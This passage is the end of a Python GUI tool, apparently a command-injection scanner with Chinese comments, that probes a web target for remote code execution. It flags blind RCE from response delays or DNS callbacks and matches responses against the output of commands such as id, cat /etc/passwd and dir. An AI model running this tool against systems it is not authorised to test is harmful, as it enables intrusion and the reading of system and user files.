                        'ping' in bypassed_payload or 
                        'timeout' in bypassed_payload):
                        
                        vuln_info = {
                            "id": len(self.vulnerabilities) + 1,
                            "url": target,
                            "payload": bypassed_payload,
                            "method": method,
                            "data_format": data_format,
                            "status_code": status_code,
                            "response_time": response_time,
                            "type": "盲RCE漏洞(时间延迟)",
                            "status": "待确认",
                            "description": f"请求响应时间为 {response_time:.2f} 秒，超过阈值 {delay_threshold} 秒，可能存在盲RCE漏洞"
                        }
                        self.vulnerabilities.append(vuln_info)
                        self.log(f"发现潜在盲RCE漏洞(时间延迟)，响应时间: {response_time:.2f}秒", "warning")
                    elif callback and callback in bypassed_payload:
                        # DNS回调解密型盲RCE需要人工确认
                        vuln_info = {
                            "id": len(self.vulnerabilities) + 1,
                            "url": target,
                            "payload": bypassed_payload,
                            "method": method,
                            "data_format": data_format,
                            "status_code": status_code,
                            "response_time": response_time,
                            "type": "盲RCE漏洞(DNS回调)",
                            "status": "待确认",
                            "description": f"可能存在盲RCE漏洞，请检查DNS回调地址 {callback} 是否收到请求"
                        }
                        self.vulnerabilities.append(vuln_info)
                        self.log(f"发现潜在盲RCE漏洞(DNS回调)，请检查回调地址", "warning")
                    else:
                        self.log(f"Payload测试无明显结果 [状态码: {status_code}]", "info")
                
            except requests.exceptions.Timeout:
                response_time = float(self.timeout.get())
                status_code = "超时"
                
                # 超时可能是时间延迟型盲RCE的特征
                if ('sleep' in bypassed_payload or 
                    'ping' in bypassed_payload or 
                    'timeout' in bypassed_payload):
                    
                    delay_threshold = int(self.delay_threshold.get() or 3)
                    if response_time > delay_threshold:
                        vuln_info = {
                            "id": len(self.vulnerabilities) + 1,
                            "url": target,
                            "payload": bypassed_payload,
                            "method": method,
                            "data_format": data_format,
                            "status_code": status_code,
                            "response_time": response_time,
                            "type": "盲RCE漏洞(时间延迟)",
                            "status": "待确认",
                            "description": f"请求超时({response_time:.2f}秒)，超过阈值 {delay_threshold} 秒，可能存在盲RCE漏洞"
                        }
                        self.vulnerabilities.append(vuln_info)
                        self.log(f"请求超时，可能存在盲RCE漏洞(时间延迟)", "warning")
                else:
                    self.log(f"Payload测试超时 [超过 {self.timeout.get()} 秒]", "info")
                
        except Exception as e:
            self.log(f"测试payload时出错: {str(e)}", "error")
    
    def analyze_response(self, response_text, payload, response_time):
        """分析响应判断是否存在RCE漏洞"""
        # 检查命令执行特征
        # 检查Linux命令结果
        linux_patterns = [
            (r"root:.*:0:0:", "成功执行id命令，返回了root用户信息"),
            (r"uid=\d+.*gid=\d+", "成功执行id命令，返回了用户ID信息"),
            (r"bin:.*:1:1:", "成功执行cat /etc/passwd，返回了系统用户信息"),
            (r"^total \d+", "成功执行ls命令，返回了目录列表"),
            (r"^[d-]rwxrwxrwx", "成功执行ls -l命令，返回了文件权限信息")
        ]
        
        for pattern, desc in linux_patterns:
            if re.search(pattern, response_text, re.MULTILINE):
                return True, "直接命令执行(Linux)", desc
        
        # 检查Windows命令结果
        windows_patterns = [
            (r"USERNAME=.*", "成功执行echo %USERNAME%，返回了用户名"),
            (r"PROCESSOR_ARCHITECTURE=.*", "成功执行系统变量查询，返回了系统信息"),
            (r"Directory of.*", "成功执行dir命令，返回了目录列表"),
            (r"Volume in drive .* is .*", "成功执行dir命令，返回了卷信息"),
            (r"Windows NT.*", "成功执行系统信息查询，返回了Windows版本信息")
        ]
        
        for pattern, desc in windows_patterns:
            if re.search(pattern, response_text, re.MULTILINE):
                return True, "直接命令执行(Windows)", desc
        
        # 检查通用命令结果
        common_patterns = [
            (r"127\.0\.0\.1", "成功执行ping命令，返回了本地回环地址"),
            (r"Pinging .* with 32 bytes of data", "成功执行ping命令，返回了ping结果")
        ]
        
        for pattern, desc in common_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True, "直接命令执行", desc
        
        return False, "", ""

if __name__ == "__main__":
    root = tk.Tk()
    app = RCEExploitTool(root)
    root.mainloop()
    
